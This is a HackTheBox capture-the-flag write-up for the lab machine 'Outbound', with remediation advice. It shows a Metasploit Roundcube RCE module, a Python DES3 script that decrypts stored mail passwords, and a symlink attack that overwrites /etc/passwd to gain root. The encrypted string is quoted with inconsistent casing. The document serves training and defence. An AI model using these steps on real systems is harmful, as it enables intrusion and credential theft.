# HackTheBox - Outbound Writeup

**Machine:** Outbound  
**IP Address:** 10.10.11.77  
**Difficulty:** Easy
**OS:** Linux

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Provided Credentials

- `tyler / LhKL1o9Nm3X2`

### Nmap

```bash
nmap -A -p- 10.10.11.77 -T4
```

**Open Ports:**

- 22/tcp (OpenSSH 9.6p1)
- 80/tcp (nginx 1.24.0) → redirected to `http://mail.outbound.htb/`

---

## Initial Access

### Roundcube RCE (CVE-2025-49113)

Target ran Roundcube 1.6.10. Used Metasploit module:

```
exploit/multi/http/roundcube_auth_rce_cve_2025_49113
```

Authenticated with:

- `tyler / LhKL1o9Nm3X2`

### Roundcube DB Config

From the host:

```
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube
```

DES3 key found:

```
rcmail-!24ByteDESkey*Str
```

### Decrypt Roundcube Password

Encrypted string:

```
L7Rv00A8TuwJAr67kITxxcSGnIk25Am/
```

Decrypt script:

```python
from base64 import b64decode
from Crypto.Cipher import DES3

encrypted_password = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
des_key = b'rcmail-!24ByteDESkey*Str'

data = b64decode(encrypted_password)
iv = data[:8]
ciphertext = data[8:]

cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
cleaned = decrypted.rstrip(b"\x00").rstrip(b"\x08").decode('utf-8', errors='ignore')

print("[+] Пароль:", cleaned)
```

Recovered password:

- `595mO8DmwGeD`

---

## Privilege Escalation - User

Switched to `jacob` with recovered credentials.

Mail discovery:

```
/home/jacob/mail/INBOX/jacob
```

Internal email revealed new credentials:

- `gY4Wr3a1evp4`

Mail from Mel also mentioned enabling the **Below** monitoring tool.

---

## Privilege Escalation - Root

### Below Log Symlink Abuse

Below writes logs to `/var/log/below/error_root.log`. Abused symlink to overwrite `/etc/passwd`:

```bash
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
cp /tmp/fakepass /var/log/below/error_root.log
su pwn
```

**Result:** Root shell.

---

## Key Takeaways

1. Authenticated Roundcube vulnerabilities can lead to server compromise.
2. Application config files often contain database secrets and crypto keys.
3. Email contents frequently leak passwords and internal tooling details.
4. Log file symlink abuse can overwrite privileged files and escalate to root.

---

## Tools Used

- nmap
- Metasploit
- Python (DES3 decrypt script)
- SSH/su

---

## Flags

**User Flag:** Not recorded in PDF  
**Root Flag:** Not recorded in PDF

---

## Remediation Recommendations

### Critical Severity

1. **Patch Roundcube (CVE-2025-49113)**

   - **Issue:** Authenticated RCE in Roundcube 1.6.10.
   - **Impact:** Full server compromise.
   - **Remediation:**
     - Upgrade Roundcube immediately.
     - Restrict webmail access to trusted networks.

2. **Protect Cryptographic Secrets**

   - **Issue:** DES key stored in config enabled password decryption.
   - **Impact:** Credential compromise across mail users.
   - **Remediation:**
     - Store secrets in a vault and rotate regularly.
     - Enforce encrypted secrets at rest.

### High Severity

3. **Harden Mailbox Access**

   - **Issue:** Sensitive credentials were shared via internal mail.
   - **Impact:** Lateral movement between accounts.
   - **Remediation:**
     - Use secure password distribution mechanisms.
     - Monitor mail content for credentials.

4. **Fix Below Log File Privileges**

   - **Issue:** Symlinkable root log file allowed /etc/passwd overwrite.
   - **Impact:** Root user creation and escalation.
   - **Remediation:**
     - Use `O_NOFOLLOW` and secure log permissions.
     - Run Below with restricted privileges.
